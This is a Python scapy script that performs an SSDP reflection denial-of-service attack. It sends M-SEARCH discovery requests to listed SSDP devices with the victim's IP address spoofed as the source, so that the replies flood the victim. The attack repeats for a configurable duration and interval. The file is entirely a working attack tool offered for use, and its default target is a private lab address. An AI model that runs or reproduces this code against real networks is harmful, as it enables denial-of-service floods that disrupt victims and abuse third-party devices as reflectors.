from scapy.all import *
import argparse
import sys

parser = argparse.ArgumentParser(description="SSDP IP-Spoofed based attack")
parser.add_argument('--proxies', '-p', action='append',
                     help="SSDP services that could be utilized as proxy to attack victim.")
parser.add_argument('--victim', '-v', default="172.16.0.2",
                     help="Victim of the attack. Default is 172.16.0.2")
parser.add_argument('--duration', '-d', default=80, type=int,
                    help="Duration of the attack, default is 80 seconds")
parser.add_argument('--interval', '-i', default=50, type=int,
                    help="Interval between two seperate round of attack, default is 50 milleseconds")

namespace = parser.parse_args()
proxies = namespace.proxies
target_ip = namespace.victim
duration = namespace.duration
interval = namespace.interval/1000
spoofed_packets = list()

if not proxies:
     sys.exit("At least one proxy should be provided to accomplish the attack.")

msg = \
     'M-SEARCH * HTTP/1.1\r\n' \
     'HOST:239.255.255.250:1900\r\n' \
     'ST:upnp:rootdevice\r\n' \
     'MX:2\r\n' \
     'MAN: "ssdp:discover"\r\n' \
     '\r\n'

for proxy in proxies:
     arp = ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=proxy)
     res, _ = sr(arp)
     packet = Ether(dst=res[0].answer.hwsrc) / IP(src=target_ip, dst=proxy) / UDP(sport=3333, dport=1900) / msg
     spoofed_packets.append(packet)

END = time.time() + duration
while time.time() < END:
     for packet in spoofed_packets:
          sendp(packet)
     time.sleep(interval)
